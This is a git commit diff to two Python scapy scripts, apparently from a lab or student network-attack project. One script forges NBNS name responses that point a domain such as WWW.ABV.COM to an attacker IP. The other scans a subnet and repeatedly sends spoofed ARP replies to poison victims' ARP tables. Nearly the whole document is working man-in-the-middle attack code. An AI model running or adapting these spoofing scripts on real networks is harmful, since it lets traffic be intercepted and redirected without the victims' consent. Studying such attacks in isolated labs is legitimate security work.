b99ac11df076f0d3f37303efda8d85ee3d8387cb
Ne184 <nevena.gincheva@abv.bg>
2022-06-17 13:53:55 +0200

    merge

--- DNSLocalABV.py
+++ DNSLocalABV.py
@@ -7,16 +7,14 @@ def processPkt(packet):
             packet = modifyPkt(scapyPkt)
         except IndexError:
             print("Error")
-            pass
-        #packet.set_payload(bytes(scapyPkt))
-    #packet.accept()
+            pass    
     sendp(packet, loop = 0, verbose = 2)
 
 def modifyPkt(packet):
     etherL = Ether(dst = "08:00:27:b7:c4:af", src = "08:00:27:D0:25:4B")
     ipL = IP(src = "192.168.56.103", dst = "192.168.56.101")
     udpL = UDP(sport = packet[UDP].dport, dport = packet[UDP].sport)
-    nbnsResL = NBNSQueryResponse(ANCOUNT=1, FLAGS = 0x8500, NAME_TRN_ID= packet[NBNSQueryRequest].NAME_TRN_ID, RR_NAME = "WWW.GOOGLE.COM",SUFFIX = packet[NBNSQueryRequest].SUFFIX, NB_ADDRESS ="192.168.56.102", QDCOUNT=0, NSCOUNT=0, ARCOUNT=0)
+    nbnsResL = NBNSQueryResponse(ANCOUNT=1, FLAGS = 0x8500, NAME_TRN_ID= packet[NBNSQueryRequest].NAME_TRN_ID, RR_NAME = "WWW.ABV.COM",SUFFIX = packet[NBNSQueryRequest].SUFFIX, NB_ADDRESS ="192.168.56.103", QDCOUNT=0, NSCOUNT=0, ARCOUNT=0)
     packet = etherL / ipL / udpL / nbnsResL
     print(packet.show())
     #dnsname = packet[HTTPResponse].payload
@@ -28,7 +26,7 @@ def modifyPkt(packet):
     #packet[DNS].an = DNSRR(rrname=dnsname, rdata = dns_hosts[dnsname])
     #packet[DNS].ancount = 1 #???
     #del packet[IP].len
-    #del packet[IP].chksum
+    #del packet[IP].chsum
     #del packet[UDP].len    
     #del packet[UDP].chksum
     
--- arpPoisoning.py
+++ arpPoisoning.py
@@ -12,7 +12,7 @@ def spoofedPkt(macVictim, ipVictim, ipToSpoof):
     arp[ARP].hwdst = macVictim
     arp[ARP].pdst = ipVictim           
 
-    sendp(arp, loop = 0, iface="enp0s3") # inter -> 60 sec to wait between 2 pkts
+    sendp(arp, inter = 60, loop = 1, iface="enp0s9") # inter -> 60 sec to wait between 2 pkts
 
 def gratutiousARP(macVictim, ipVictim, ipToSpoof):
     #arp response that was not prompt by arp request
@@ -23,18 +23,19 @@ def gratutiousARP(macVictim, ipVictim, ipToSpoof):
     arp[ARP].hwdst = macVictim
     arp[ARP].pdst = ipVictim 
     arp[ARP].op = "is-at"
+    print("MacVictim: ", macVictim)
     
-    sendp(arp, loop = 0, iface="enp0s3") # inter -> 60 sec to wait between 2 pkts
+    sendp(arp, inter = 60, loop = 1, iface="enp0s9") # inter -> 60 sec to wait between 2 pkts
     
 
 #ping all host with IPs between 192.168.56.99-103
 #hosts = sr(IP(dst = "192.168.56.100/30")/ICMP(), timeout=2) 
 
-hosts = arping("192.168.56.100/30") #checks which IPs in the range: 192.168.56.100-108 are up
+hosts = arping("10.0.2.0/24") #checks which IPs in the range: 192.168.56.100-108 are up
 dictIPMAC = {}
 for i in range(len(hosts[0])): #hosts[0] contains the answers form the hosts that are up
     dictIPMAC[hosts[0][i][1][ARP].psrc] = hosts[0][i][1][ARP].hwsrc
-    print("Host ", hosts[0][i][1][ARP].psrc, "is up")
+    print("Host ", hosts[0][i][1][ARP].psrc, "is up") #52:54:00:12:35:00
     
 print ( '\033[0m'  +"--------------------------------------------------------")
 print("How many hosts arp tables do you want to spoof: ")
@@ -53,12 +54,15 @@ for i in range(inputNumber):
 print("You want to poision the arp tables of ", ipVictims)
 
 #shouldn't we make this automatic to make it work on multiple systems?
-macAttacker = "08:00:27:D0:25:4B"            
-ipAttacker = "192.168.56.103"
+macAttacker = "08:00:27:96:ae:0b"            
+ipAttacker = "10.0.2.5"
 
 for i in range(len(ipVictims)):
     macVictim = dictIPMAC[ipVictims[i]]
     ipVictim = ipVictims[i]
     ipToSpoof = ipsToBeSpoofed[i]
     #spoofedPkt(macVictim, ipVictim, ipToSpoof)
-    gratutiousARP(macVictim, ipVictim, ipToSpoof)
+    # gratutiousARP(macVictim, ipVictim, ipToSpoof)
+    spoofedPkt(macVictim, ipVictim, ipToSpoof)
+
+#print("ARP poisoning of: " + ipVictims + " complete!")
